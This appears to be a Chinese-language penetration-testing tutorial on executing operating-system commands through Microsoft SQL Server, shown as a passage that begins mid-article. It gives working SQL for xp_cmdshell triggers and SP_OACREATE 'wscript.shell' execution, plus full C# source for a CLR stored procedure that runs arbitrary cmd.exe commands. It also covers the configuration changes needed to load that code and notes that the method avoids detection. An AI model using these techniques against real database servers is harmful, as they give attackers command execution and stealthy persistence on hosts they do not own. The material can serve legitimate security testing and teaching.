#### xp_fileexist
判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。
**判读文件是否存在**
    exec xp_fileexist 'C:\\test\test.txt'
**列出当前目录**
    exec xp_subdirs "C:\\"
#### xp_getnetname
**获取服务器名称**
    exec xp_getnetname
#### xp_msver
**获取服务器信息**
    exec xp_msver
#### xp_fixeddrives
**获取磁盘空间信息**
    exec xp_fixeddrives
附常用的一些危险的存储过程，可自查存储过程的功能和用法。
    xp_cmdshell
    xp_dirtree
    xp_enumgroups
    xp_fixeddrives
    xp_loginconfig
    xp_enumerrorlogs
    xp_getfiledetails
    Sp_OACreate
    Sp_OADestroy
    Sp_OAGetErrorInfo
    Sp_OAGetProperty
    Sp_OAMethod
    Sp_OASetProperty
    Sp_OAStop
    Xp_regaddmultistring
    Xp_regdeletekey
    Xp_regdeletevalue
    Xp_regenumvalues
    Xp_regread
    Xp_regremovemultistring
    Xp_regwrite
    sp_makewebtask
### SQL Server 触发器
SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。
首先创建一个test表，插入字段值。
创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。
    set ANSI_NULLS on
    go
    set QUOTED_IDENTIFIER on
    go
    create trigger [test1]
    on [test]
    AFTER UPDATE as
    begin
        execute master..xp_cmdshell 'cmd.exe /c calc.exe'
    end
    go
执行下列更新test表操作，test1触发器触发。
    UPDATE test SET name = 'wangwu' WHERE LastName = 'zhangsan'
### SQL Server COM组件
SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。
#### SP_OACREATE
查看SP_OACREATE状态。
    select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
利用count(*)判断是否存在，，存在即返回1。
    select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
#### 启用SP_OACREATE
利用sp_configure存储过程，启用SP_OACREATE
    exec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE;   
    exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;
#### 利用SP_OACREATE执行命令
利用SP_OACREATE执行系统命令
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c whoami /all >C:\\test\test.txt'
### SQL Server CLR相关利用
CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft
Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括
Microsoft Visual Basic .NET 和 Microsoft Visual
C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。
官方链接：
在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。
#### 创建CLR
利用VS创建MSSQL数据库项目
修改目标平台和勾选创建脚本
在SQL Server
2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：
    CREATE ASSEMBLY SQLCLRTest  
    FROM 'C:\MyDBApp\SQLCLRTest.dll'  
    WITH PERMISSION_SET = SAFE;  
其权限集有三个选项：
SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。
EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。
UNSAFE：允许使用任何代码。
微软关于SQL CLR的详细文档可通过以下地址获得： 
修改目标框架和权限级别为UNSAFE。
创建SQL CLR C# 存储过程
写入代码
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Data.SqlTypes;
    using System.Diagnostics;
    using System.Text;
    using Microsoft.SqlServer.Server;
    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void ExecCommand (string cmd)
        {
            // 在此处放置代码
            SqlContext.Pipe.Send("Command is running, please wait.");
            SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
        }
        public static string RunCommand(string filename,string arguments)
        {
            var process = new Process();
            process.StartInfo.FileName = filename;
            if (!string.IsNullOrEmpty(arguments))
            {
                process.StartInfo.Arguments = arguments;
            }
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            var stdOutput = new StringBuilder();
            process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
            string stdError = null;
            try
            {
                process.Start();
                process.BeginOutputReadLine();
                stdError = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }
            if (process.ExitCode == 0)
            {
                SqlContext.Pipe.Send(stdOutput.ToString());
            }
            else
            {
                var message = new StringBuilder();
                if (!string.IsNullOrEmpty(stdError))
                {
                    message.AppendLine(stdError);
                }
                if (stdOutput.Length != 0)
                {
                    message.AppendLine("Std output:");
                    message.AppendLine(stdOutput.ToString());
                }
                SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
            }
            return stdOutput.ToString();
        }
    }
编译生成DLL文件。
运行权限级别为“SAFE”的代码，只需启用CLR就可以了；但是，要想运行权限级别为“EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍：
**对于SQL Server 2017之前的版本**
显示高级选项：
    sp_configure 'show advanced options',1;RECONFIGURE
启用CLR：
    sp_configure 'clr enabled',1;RECONFIGURE;
将存储.Net程序集的数据库配置为可信赖的。
    ALTER DATABASE master SET TRUSTWORTHY ON;
**SQL Server 2017及更高版本**
对于SQL Server
2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL
Server 2017及以上版本，如下所示：
显示高级选项：
    sp_configure 'show advanced options',1;RECONFIGURE
启用CLR：
    sp_configure 'clr enabled',1;RECONFIGURE;
将某程序集的SHA512哈希值添加到可信程序集列表中：
    sp_add_trusted_assembly @hash= ;
从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。
通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二进制文件并将其写入SQL服务器进程可访问的位置：